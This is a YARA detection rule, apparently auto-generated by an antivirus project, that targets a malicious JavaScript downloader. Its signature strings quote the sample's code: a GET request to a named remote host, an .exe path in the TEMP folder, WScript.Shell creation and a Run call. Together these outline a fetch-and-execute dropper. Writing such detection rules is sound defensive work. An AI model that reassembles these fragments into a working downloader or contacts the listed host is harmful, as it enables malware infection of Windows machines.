rule sig_20160329_d92c728d6149a012626b97ca81725735 {
  meta:
    description = "datamaliciousorder - file 20160329_d92c728d6149a012626b97ca81725735.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "13a7803deee621458d779ce5c57cba4084513921d70e64e5016de4dd712a69e2"

  strings:
    $s1  = "W[Pr](\"GET\", \"http://icurlers.com/sodp1os\", false);" fullword ascii
    $s2  = "function Uf() {return s[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RXwwhFNkBdW.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[rI](j() * 11); if (W[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var s = function V() {return WScript[q](\"WScript.Shell\");}(), oa = 11;" fullword ascii
    $s5  = "function GI(E, H0){V0 = V0 * 1; return E - H0;};" fullword ascii
    $s6  = "function K(){return \"\" + N;};" fullword ascii
    $s7  = "function o() {return ((iI == true) && (iI == A)) ? 1 : V0;};" fullword ascii
    $s8  = "function C(e){s[\"Run\"](e, V0, V0);};" fullword ascii
    $s9  = " while (D){" fullword ascii
    $s10 = "function j(){return 22;};" fullword ascii
    $s11 = "function Wl(cf) {var jd = (1, 2, 3, 4, 5, cf); return jd;};" fullword ascii
    $s12 = "function H(){return q;};" fullword ascii
    $s13 = "return GI(n, FY);" fullword ascii
    $s14 = "var jG = new this[\"Date\"]();" fullword ascii
    $s15 = "function bJ()" fullword ascii
    $s16 = "A = true; " fullword ascii
    $s17 = "var ft = false;" fullword ascii
    $s18 = "iI = true; " fullword ascii
    $s19 = "var iI = false;" fullword ascii
    $s20 = "} catch(a){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}